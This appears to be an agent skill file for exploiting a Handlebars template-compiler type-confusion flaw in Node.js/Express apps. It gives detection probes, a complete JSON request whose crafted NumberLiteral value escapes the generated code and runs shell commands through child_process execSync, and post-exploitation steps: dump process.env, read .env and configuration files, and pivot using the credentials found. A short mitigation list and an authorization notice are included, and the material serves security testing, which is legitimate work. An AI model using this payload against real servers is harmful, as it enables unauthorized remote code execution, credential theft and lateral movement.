---
name: handlebars-ast-type-confusion-rce
description: Test and exploit Handlebars compile() type confusion where a HTTP/JSON field reaches compile() as a pre-parsed AST object instead of a string, leading to server-side JavaScript execution. Use on authorized Node.js/Express targets when a user-controlled template field is compiled.
domain: cybersecurity
subdomain: application-security
tags:
- handlebars
- ssti
- ast-injection
- nodejs
- rce
- type-confusion
version: '1.0'
author: bugbounty
license: Apache-2.0
nist_csf:
- ID.RA-01
- PR.PS-02
mitre_attack:
- T1190
- T1059.007
---
# Handlebars AST Type Confusion RCE

> **Legal Notice:** Authorized security testing only. Do not run against systems without written permission.

## Overview

Handlebars < 4.7.9 accepted attacker-supplied AST objects in `compile()`.
`NumberLiteral.value` was emitted into generated JavaScript without quoting.
If a JSON property is passed directly to `compile()`, a crafted object can break
out of the generated function and execute a process-level command.

This differs from classic Handlebars SSTI. Prototype access control and older
gadgets may be patched, but an object supplied as the “template” still reaches
the compiler.

## When to Use

- A Node/Express app accepts JSON and passes a field to `Handlebars.compile()`
- A field is validated with `.isLength()` or similar but not `.isString()`
- Classic SSTI payloads render literally or are blocked
- The app uses `handlebars` >= 4.0.0 and <= 4.7.8

## Detection

1. Identify the render sink. Look for:
   - `Handlebars.compile(userInput)`
   - `compiled()` or `template()`
   - a JSON body accepted where a text field is expected
2. Check the installed version:
   ```bash
   node -e "console.log(require('handlebars/package.json').version)"
   ```
3. Send a benign AST. If the response is empty instead of a rendered string,
   the source may be treating it as an AST:
   ```json
   {"field":{"type":"Program","body":[],"loc":null}}
   ```
4. Try a `NumberLiteral` callback that returns a harmless value:
   ```json
   {
     "type":"Program",
     "body":[{
       "type":"MustacheStatement",
       "path":{"type":"PathExpression","data":false,"depth":0,"parts":["lookup"],"original":"lookup","loc":null},
       "params":[
         {"type":"PathExpression","data":false,"depth":0,"parts":[],"original":"this","loc":null},
         {"type":"NumberLiteral","value":"{},{})) + 'AST_OK' //","original":1,"loc":null}
       ],
       "escaped":true,
       "strip":{"open":false,"close":false},
       "loc":null
     }],
     "loc":null
   }
   ```

## Exploit

Use a command whose output is returned. `execSync()` throws on non-zero exit,
so append `; true` or redirect stderr.

```text
{},{})) + process.mainModule.require('child_process').execSync('id').toString() //
```

Full request shape:

```json
{
  "name":"rce",
  "campaign_id":1,
  "field":{
    "type":"Program",
    "body":[{
      "type":"MustacheStatement",
      "path":{"type":"PathExpression","data":false,"depth":0,"parts":["lookup"],"original":"lookup","loc":null},
      "params":[
        {"type":"PathExpression","data":false,"depth":0,"parts":[],"original":"this","loc":null},
        {"type":"NumberLiteral","value":"{},{})) + process.mainModule.require('child_process').execSync('id; true').toString() //","original":1,"loc":null}
      ],
      "escaped":true,
      "strip":{"open":false,"close":false},
      "loc":null
    }],
    "loc":null
  }
}
```

## Post-Exploitation

- Read process environment; Node services often leak DB and session secrets:
  ```text
  process.env
  ```
- Read application `.env`, source, and service configuration.
- Pivot to any database or AD credential found.

## Validation

- `id` output confirms code execution.
- Repeat with a command that writes a unique file or calls back to a controlled
  listener.
- Verify behavior is not a 500/error from invalid JSON.

## Mitigations

- Never compile user input as a template. Render data into fixed templates.
- Enforce `typeof value === "string"` before `compile()`.
- In `express-validator`, add `.isString()`; `isLength` alone is not a type check.
- Upgrade to a patched Handlebars release.
- Run template rendering in a sandbox/worker without filesystem or process access.

## References

- GHSA-2w6w-674q-4c4q
- GHSA-8r5x-fm3f-whwj
- CVE-2026-33940
